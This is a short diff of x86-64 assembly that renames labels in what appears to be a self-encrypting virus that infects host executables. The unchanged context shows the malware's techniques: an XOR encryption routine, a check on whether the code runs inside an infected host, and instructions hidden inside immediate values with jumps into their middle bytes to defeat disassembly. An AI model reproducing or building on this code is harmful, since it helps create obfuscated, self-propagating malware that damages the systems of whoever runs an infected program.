@@ -58,8 +58,8 @@ _h3ll0w0rld:
 ; =
 
 	cmp rax, 0x0
-	jz .ahah - 2; has to jmp on [48 31 c0] -> xor rax, rax
-	jmp .here
+	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
+	jmp .happy_mix
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
 		push rdx
 		lea rdi, [rel _start]
@@ -84,8 +84,8 @@ _h3ll0w0rld:
 		call _xor_encrypt
 		pop rdx
 
-	jmp .ft + 5; jmp on eb 24 -> jmp .infected
-	.here:
+	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
+	.happy_mix:
 	push 2
 	pop rdi
 	lea rsi, [rel .gandalf + 2]
@@ -97,10 +97,10 @@ _h3ll0w0rld:
 	jmp $+4; has to skip 2 byte of instruction next line
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
-	.ft:
+	.ft_juggling:
 	mov rax, 0xc0314824eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
-	.ahah:
+	.sneakyboi:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz .code ; .xor_decrypt
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
